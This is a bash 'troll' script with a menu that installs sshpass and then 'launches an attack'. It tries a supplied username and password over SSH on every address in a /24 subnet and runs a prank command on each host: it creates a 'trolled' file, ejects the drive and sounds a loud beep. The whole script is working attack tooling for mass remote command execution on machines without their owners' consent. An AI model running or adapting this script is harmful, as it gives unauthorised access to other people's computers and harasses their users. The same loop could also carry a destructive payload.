#!/usr/bin/env bash

# FUNCTIONS
function checkOption(){
        case $1 in
                1)
                        echo ''
                        echo '[*] You chose to install dependencies'
                        installDependencies
                        ;;
                2)
                        echo ''
                        echo '[*] You chose to attack'
                        read -p 'Username: ' USERNAME
                        read -p 'Password: ' PASSWORD
                        read -p 'Subnet address (Example: 192.168.1): ' IP
                        troll $USERNAME $PASSWORD $IP
                        ;;
                99)
                        exit
                        ;;
                *)
                        echo ''
                        echo '[-] Error: Wrong option'
                        ;;
        esac
}

function installDependencies(){
        sudo apt install sshpass openssh-client -y
}

function menu(){
        while true; do
                echo 'MENU:'
                echo '  1-Install dependencies (recommended if this is your first time)'
                echo '  2-Launch attack'
                echo '  99-Exit'
                echo ''
                read -p 'OPTION: ' OPTION
                checkOption $OPTION
                read -p 'Press enter to continue'
                clear
        done
}

function troll(){
        USER=$1
        PASSWORD=$2
        SUBNET=$3 #'192.168.1'
        echo "[*] Starting attack on subnet ${SUBNET}.0/24"
        SECONDS=0
        for COUNTER in $(seq 2 254); do
                echo "[*] Attacking ${USER}@${SUBNET}.${COUNTER}"
                sshpass -p${PASSWORD} ssh ${USER}@${SUBNET}.${COUNTER} 'touch ~/trolled.haha;eject; beep -f 2500 -l 2500' &
        done
        echo '[*] Attack done'
        ELAPSED_TIME="[*] Elapsed time: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
        echo $ELAPSED_TIME
}

# MAIN
menu
